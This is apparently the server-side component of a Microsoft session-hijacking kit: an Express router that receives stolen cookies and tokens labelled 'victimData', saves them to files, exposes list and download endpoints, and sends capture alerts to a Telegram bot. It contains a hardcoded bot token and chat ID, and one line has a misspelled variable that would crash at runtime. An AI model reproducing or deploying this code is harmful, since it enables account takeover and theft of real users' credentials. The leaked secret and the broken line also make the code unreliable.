const express = require("express");
const fs = require('fs').promises;
const path = require('path');
const router = express.Router();

// ==================== CONFIGURATION ====================
const BOT_TOKEN = process.env.BOT_TOKEN || "6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4";
const CHAT_ID = process.env.CHAT_ID || "6068638071";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
const DATA_DIR = path.join(__dirname, '../data/sessions');

// ==================== FILE MANAGEMENT ====================
async function ensureDataDir() {
  try {
    await fs.access(DATA_DIR);
  } catch (error) {
    await fs.mkdir(DATA_DIR, { recursive: true });
    console.log('Created data directory:', DATA_DIR);
  }
}

function sanitizeFilename(filename) {
  return filename.replace(/[^a-zA-Z0-9._-]/g, '_');
}

async function saveSessionData(victimData) {
  await ensureDataDir();
  
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const service = victimData.service || 'unknown';
  const filename = `session_${service}_${timestamp}.json`;
  const safeFilename = sanitizeFilename(filename);
  const filepath = path.join(DATA_DIR, safeFilename);
  
  // Enhanced data with file info
  const enhancedData = {
    ...victimData,
    file_info: {
      filename: safeFilename,
      saved_at: new Date().toISOString(),
      download_url: `/chukachina/download/${safeFilename}`
    }
  };
  
  await fs.writeFile(filepath, JSON.stringify(enhancedData, null, 2));
  console.log('💾 Session data saved:', safeFilename);
  
  return {
    filename: safeFilename,
    filepath: filepath,
    download_url: `/chukachina/download/${safeFilename}`
  };
}

// ==================== TELEGRAM ALERT ====================
async function sendTelegramAlert(victimData, fileInfo) {
  try {
    const message = `🔐 <b>MICROSOFT SESSION CAPTURED</b>

🎯 <b>Service:</b> ${victimData.service}
📧 <b>User Profile:</b> ${victimData.user_profile || 'Not found'}
🌐 <b>Domain:</b> ${victimData.page_url}

📊 <b>Data Captured:</b>
├ Cookies: ${victimData.cookies?.length || 0}
├ Tokens: ${victimData.local_storage_tokens?.length || 0}
└ Type: ${victimData.type}

💾 <b>Storage:</b>
├ File: <code>${fileInfo.filename}</code>
├ Download: /download/${fileInfo.filename}
└ Time: ${new Date().toISOString()}

⚠️ <b>Session hijacking possible immediately</b>`;

    const response = await fetch(TELEGRAM_API, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });

    return await response.json();
  } catch (error) {
    console.error('Telegram error:', error);
    return null;
  }
}

// ==================== MAIN ENDPOINT ====================
router.post('/activities', async (req, res) => {
  try {
    console.log('🎯 New Microsoft session data received!');
    
    const victimData = req.body;
    
    // Validate the data structure
    if (!victimData.type || !victimData.service) {
      return res.status(400).json({ 
        success: false, 
        message: "Invalid data format from script" 
      });
    }
    
    // Save to file
    const fileInfo = await saveSessionData(victimData);
    
    // Log the received data
    console.log('📥 Data Type:', victimData.type);
    console.log('🌐 Service:', victimData.service);
    console.log('🍪 Cookies found:', victimData.cookies?.length || 0);
    console.log('🔑 Tokens found:', victimimData.local_storage_tokens?.length || 0);
    console.log('💾 Saved as:', fileInfo.filename);
    
    // Send Telegram alert with file info
    await sendTelegramAlert(victimData, fileInfo);
    
    // Return success response with download info
    res.status(200).json({
      success: true,
      message: "Session data received and saved successfully",
      data_received: {
        type: victimData.type,
        service: victimData.service,
        cookies_count: victimData.cookies?.length || 0,
        tokens_count: victimData.local_storage_tokens?.length || 0,
        profile_found: !!victimData.user_profile
      },
      storage_info: {
        filename: fileInfo.filename,
        download_url: `https://chuksinno-backend-1.onrender.com/chukachina/download/${fileInfo.filename}`,
        saved_at: new Date().toISOString()
      },
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error("Error processing session data:", error);
    res.status(500).json({
      success: false,
      message: "Internal server error",
      error: error.message
    });
  }
});

// ==================== DOWNLOAD ENDPOINT ====================
router.get('/download/:filename', async (req, res) => {
  try {
    const filename = req.params.filename;
    const safeFilename = sanitizeFilename(filename);
    
    // Security check
    if (safeFilename !== filename) {
      return res.status(400).json({ 
        success: false, 
        message: "Invalid filename" 
      });
    }
    
    const filepath = path.join(DATA_DIR, safeFilename);
    
    // Check if file exists
    try {
      await fs.access(filepath);
    } catch (error) {
      return res.status(404).json({ 
        success: false, 
        message: "File not found" 
      });
    }
    
    // Set headers and send file
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', `attachment; filename="${safeFilename}"`);
    
    const fileContent = await fs.readFile(filepath, 'utf8');
    res.send(fileContent);
    
    console.log('📤 File downloaded:', safeFilename);
    
  } catch (error) {
    console.error('Error downloading file:', error);
    res.status(500).json({ 
      success: false, 
      message: "Error downloading file" 
    });
  }
});

// ==================== LIST FILES ENDPOINT ====================
router.get('/sessions', async (req, res) => {
  try {
    await ensureDataDir();
    
    const files = await fs.readdir(DATA_DIR);
    const sessionFiles = files.filter(file => file.endsWith('.json'));
    
    const sessions = await Promise.all(
      sessionFiles.map(async (file) => {
        const filepath = path.join(DATA_DIR, file);
        const content = await fs.readFile(filepath, 'utf8');
        const data = JSON.parse(content);
        
        return {
          filename: file,
          service: data.service,
          type: data.type,
          timestamp: data.timestamp,
          cookies_count: data.cookies?.length || 0,
          tokens_count: data.local_storage_tokens?.length || 0,
          download_url: `/chukachina/download/${file}`
        };
      })
    );
    
    res.json({
      success: true,
      total_sessions: sessions.length,
      sessions: sessions
    });
    
  } catch (error) {
    console.error('Error listing sessions:', error);
    res.status(500).json({
      success: false,
      message: "Error listing session files"
    });
  }
});

// ==================== HEALTH CHECK ====================
router.get('/health', async (req, res) => {
  try {
    await ensureDataDir();
    
    const files = await fs.readdir(DATA_DIR);
    const sessionCount = files.filter(file => file.endsWith('.json')).length;
    
    res.json({
      success: true,
      message: "Session capture endpoint is running",
      endpoint: "/activities",
      features: {
        file_storage: true,
        download_endpoint: true,
        sessions_list: true,
        telegram_alerts: true
      },
      statistics: {
        total_sessions: sessionCount,
        data_directory: DATA_DIR
      },
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: "Health check failed",
      error: error.message
    });
  }
});

module.exports = router;